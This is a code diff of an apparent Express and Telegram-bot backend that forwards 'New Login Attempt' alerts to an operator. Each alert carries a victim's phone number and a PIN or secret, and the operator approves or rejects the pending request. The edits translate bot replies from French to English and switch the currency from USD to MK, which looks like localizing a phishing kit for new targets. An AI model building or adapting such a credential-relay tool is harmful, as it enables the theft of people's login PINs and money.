@@ -90,8 +90,8 @@ app.post('/api/request-approval', async (req, res) => {
 : `🔑 pin: \`${code || '—'}\`\n`;
     const text =
       `🔔 *New Login Attempt — ${stepLabel}*\n\n` +
-      `📦 Data: ${plan || '—'}\n` +
-      `💰 Price: USD ${price || '—'}\n` +
+      `📦 Plan: ${plan || '—'}\n` +
+      `💰 Price: MK ${price || '—'}\n` +
       `📱 Phone: \`${phone || '—'}\`\n` +
       secretLine;
       
@@ -202,12 +202,12 @@ if (bot) {
     const reqData = requests.get(id);
 
     if (!reqData) {
-      await bot.answerCallbackQuery(query.id, { text: 'Demande introuvable ou expirée.' });
+      await bot.answerCallbackQuery(query.id, { text: 'Request not found or expired.' });
       return;
     }
 
     if (reqData.status !== 'pending') {
-      await bot.answerCallbackQuery(query.id, { text: `Déjà traité (${reqData.status}).` });
+      await bot.answerCallbackQuery(query.id, { text: `Already processed (${reqData.status}).` });
       return;
     }
 
